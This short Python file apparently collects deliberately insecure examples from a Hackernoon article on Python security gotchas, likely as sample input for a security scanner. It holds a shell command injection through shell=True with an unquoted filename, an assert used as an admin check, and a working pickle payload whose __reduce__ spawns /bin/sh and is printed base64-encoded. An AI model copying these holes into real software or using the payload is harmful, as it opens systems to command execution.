# contains bunch of buggy examples
# taken from https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03
import cPickle
import subprocess
import base64
import subprocess


# Input injection
def transcode_file(request, filename):
  """
    this is docstring
  """
  command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
  subprocess.call(command, shell=True)  # a bad idea!


# Assert statements
def foo(request, user):
  """
    this is docstring
  """
  assert user.is_admin, 'user does not have access'
  # secure code...


# Pickles
class RunBinSh(object):
  """
    this is docstring
  """
  def __init__ (self):
    pass
  def __reduce__(self):
    """
      this is docstring
    """
    return (subprocess.Popen, (('/bin/sh',),))


print(base64.b64encode(cPickle.dumps(RunBinSh())))
